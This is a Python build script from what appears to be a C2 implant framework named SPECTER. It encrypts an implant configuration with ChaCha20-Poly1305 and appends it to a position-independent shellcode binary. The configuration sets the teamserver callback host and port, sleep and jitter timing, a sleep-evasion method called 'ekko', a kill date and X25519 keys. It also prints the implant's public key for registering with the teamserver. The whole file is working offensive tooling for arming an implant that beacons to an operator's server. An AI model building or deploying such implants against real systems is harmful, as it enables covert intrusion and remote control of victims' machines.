#!/usr/bin/env python3
"""
SPECTER Implant — Config Blob Generator

Generates an encrypted IMPLANT_CONFIG blob and appends it to the PIC binary.
Also generates the implant's X25519 keypair and outputs the public key for
teamserver registration.

Usage:
    python build_config.py \
        --pic-blob implant/build/specter.bin \
        --output implant/build/specter_configured.bin \
        --url 192.168.1.100 \
        --port 443 \
        --sleep 10000 \
        --jitter 20 \
        --kill-date 2027-01-01 \
        --server-pubkey <64-hex-chars> \
        [--sleep-method ekko|wfs|delay] \
        [--max-retries 10] \
        [--profile-id 0]

Wire format appended to PIC blob:
    CONFIG_BLOB_HEADER {
        DWORD magic;       // 0x53504543 ("SPEC")
        DWORD version;     // 1
        DWORD data_size;   // Size of encrypted payload
        BYTE  nonce[12];   // AEAD nonce
        BYTE  tag[16];     // AEAD tag
    }
    BYTE encrypted_config[data_size]; // ChaCha20-Poly1305 encrypted IMPLANT_CONFIG
"""

import argparse
import hashlib
import os
import struct
import sys
from datetime import datetime, timezone

try:
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
except ImportError:
    print("Error: 'cryptography' package required. Install with: pip install cryptography")
    sys.exit(1)

# Constants matching config.h
CONFIG_MAGIC = 0x53504543  # "SPEC" little-endian
CONFIG_VERSION = 1
CONFIG_MAX_CHANNELS = 4
CONFIG_KEY_INPUT_SIZE = 64

CHANNEL_HTTP = 0
CHANNEL_DNS = 1
CHANNEL_SMB = 2
CHANNEL_WEBSOCKET = 3

SLEEP_EKKO = 0
SLEEP_WFS = 1
SLEEP_DELAY = 2

SLEEP_METHODS = {"ekko": SLEEP_EKKO, "wfs": SLEEP_WFS, "delay": SLEEP_DELAY}


def datetime_to_filetime(dt):
    """Convert a datetime to Windows FILETIME (100-ns intervals since 1601-01-01)."""
    epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
    delta = dt - epoch
    return int(delta.total_seconds() * 10_000_000)


def serialize_channel_config(url, port, channel_type, priority, active):
    """Serialize a CHANNEL_CONFIG struct (272 bytes)."""
    url_bytes = url.encode("ascii")[:255]
    url_padded = url_bytes + b"\x00" * (256 - len(url_bytes))
    return struct.pack("<256s I I I I", url_padded, port, channel_type, priority, active)


def serialize_implant_config(
    teamserver_pubkey,
    implant_privkey,
    implant_pubkey,
    module_signing_key,
    sleep_interval,
    jitter_percent,
    sleep_method,
    channels,
    channel_count,
    max_retries,
    kill_date_filetime,
    profile_id,
    checkin_count,
):
    """Serialize IMPLANT_CONFIG struct matching the C layout."""
    data = b""

    # 4 x 32-byte keys
    data += teamserver_pubkey
    data += implant_privkey
    data += implant_pubkey
    data += module_signing_key

    # 3 x DWORD
    data += struct.pack("<I", sleep_interval)
    data += struct.pack("<I", jitter_percent)
    data += struct.pack("<I", sleep_method)

    # 4 x CHANNEL_CONFIG (272 bytes each)
    for i in range(CONFIG_MAX_CHANNELS):
        if i < len(channels):
            data += channels[i]
        else:
            data += b"\x00" * 272

    # channel_count, max_retries (2 x DWORD)
    data += struct.pack("<I", channel_count)
    data += struct.pack("<I", max_retries)

    # Padding for QWORD alignment (kill_date)
    # Offset at this point: 32*4 + 4*3 + 272*4 + 4*2 = 128 + 12 + 1088 + 8 = 1236
    # Need 4 bytes padding to reach 8-byte alignment
    data += b"\x00" * 4

    # kill_date (QWORD)
    data += struct.pack("<Q", kill_date_filetime)

    # profile_id, checkin_count (2 x DWORD)
    data += struct.pack("<I", profile_id)
    data += struct.pack("<I", checkin_count)

    return data


def derive_config_key(pic_data):
    """Derive the config encryption key: SHA-256 of first 64 bytes of PIC."""
    key_input = pic_data[:CONFIG_KEY_INPUT_SIZE]
    return hashlib.sha256(key_input).digest()


def build_config_blob(config_data, pic_data):
    """Encrypt config and build the config blob (header + ciphertext)."""
    key = derive_config_key(pic_data)
    nonce = os.urandom(12)

    cipher = ChaCha20Poly1305(key)

    # AAD = magic + version (first 8 bytes of header)
    aad = struct.pack("<II", CONFIG_MAGIC, CONFIG_VERSION)

    # Encrypt (returns ciphertext + 16-byte tag appended)
    encrypted = cipher.encrypt(nonce, config_data, aad)

    # Split ciphertext and tag
    ciphertext = encrypted[:-16]
    tag = encrypted[-16:]

    # Build header
    header = struct.pack("<III", CONFIG_MAGIC, CONFIG_VERSION, len(ciphertext))
    header += nonce
    header += tag

    return header + ciphertext


def main():
    parser = argparse.ArgumentParser(description="SPECTER Implant Config Blob Generator")
    parser.add_argument("--pic-blob", required=True, help="Path to PIC binary (specter.bin)")
    parser.add_argument("--output", required=True, help="Output path for configured PIC blob")
    parser.add_argument("--url", required=True, help="Teamserver URL/hostname")
    parser.add_argument("--port", type=int, required=True, help="Teamserver port")
    parser.add_argument("--sleep", type=int, default=10000, help="Sleep interval in ms (default: 10000)")
    parser.add_argument("--jitter", type=int, default=20, help="Jitter percentage 0-100 (default: 20)")
    parser.add_argument("--kill-date", default=None, help="Kill date in YYYY-MM-DD format (default: none)")
    parser.add_argument("--server-pubkey", required=True, help="Teamserver X25519 public key (64 hex chars)")
    parser.add_argument("--sleep-method", choices=["ekko", "wfs", "delay"], default="ekko",
                        help="Sleep method (default: ekko)")
    parser.add_argument("--max-retries", type=int, default=10, help="Max consecutive failures (default: 10)")
    parser.add_argument("--profile-id", type=int, default=0, help="Profile ID (default: 0)")

    args = parser.parse_args()

    # Read PIC blob
    if not os.path.exists(args.pic_blob):
        print(f"Error: PIC blob not found: {args.pic_blob}")
        sys.exit(1)

    with open(args.pic_blob, "rb") as f:
        pic_data = f.read()

    print(f"[*] PIC blob size: {len(pic_data)} bytes")

    # Parse server public key
    try:
        server_pubkey_bytes = bytes.fromhex(args.server_pubkey)
        if len(server_pubkey_bytes) != 32:
            raise ValueError("Must be 32 bytes")
    except (ValueError, TypeError) as e:
        print(f"Error: Invalid server public key: {e}")
        sys.exit(1)

    # Generate implant X25519 keypair
    implant_private_key = X25519PrivateKey.generate()
    implant_privkey_bytes = implant_private_key.private_bytes_raw()
    implant_pubkey_bytes = implant_private_key.public_key().public_bytes_raw()

    # Generate random module signing key
    module_signing_key = os.urandom(32)

    # Parse kill date
    kill_date_ft = 0
    if args.kill_date:
        try:
            kd = datetime.strptime(args.kill_date, "%Y-%m-%d").replace(tzinfo=timezone.utc)
            kill_date_ft = datetime_to_filetime(kd)
        except ValueError:
            print(f"Error: Invalid kill date format: {args.kill_date} (expected YYYY-MM-DD)")
            sys.exit(1)

    # Build channel config
    channel = serialize_channel_config(
        url=args.url,
        port=args.port,
        channel_type=CHANNEL_HTTP,
        priority=0,
        active=1,
    )

    # Serialize IMPLANT_CONFIG
    config_data = serialize_implant_config(
        teamserver_pubkey=server_pubkey_bytes,
        implant_privkey=implant_privkey_bytes,
        implant_pubkey=implant_pubkey_bytes,
        module_signing_key=module_signing_key,
        sleep_interval=args.sleep,
        jitter_percent=args.jitter,
        sleep_method=SLEEP_METHODS[args.sleep_method],
        channels=[channel],
        channel_count=1,
        max_retries=args.max_retries,
        kill_date_filetime=kill_date_ft,
        profile_id=args.profile_id,
        checkin_count=0,
    )

    print(f"[*] Config data size: {len(config_data)} bytes")

    # Build encrypted config blob
    config_blob = build_config_blob(config_data, pic_data)
    print(f"[*] Config blob size: {len(config_blob)} bytes (header + encrypted)")

    # Write output: PIC blob + config blob
    output_data = pic_data + config_blob

    with open(args.output, "wb") as f:
        f.write(output_data)

    total_size = len(output_data)
    print(f"[*] Output written to: {args.output}")
    print(f"[*] Total size: {total_size} bytes ({total_size / 1024:.1f} KB)")
    if total_size > 20480:
        print(f"[!] WARNING: Total size exceeds 20 KB target!")

    # Output implant public key for teamserver registration
    print()
    print(f"[+] Implant public key (register with teamserver):")
    print(f"    {implant_pubkey_bytes.hex()}")
    print()
    print(f"[+] Server public key used:")
    print(f"    {server_pubkey_bytes.hex()}")


if __name__ == "__main__":
    main()
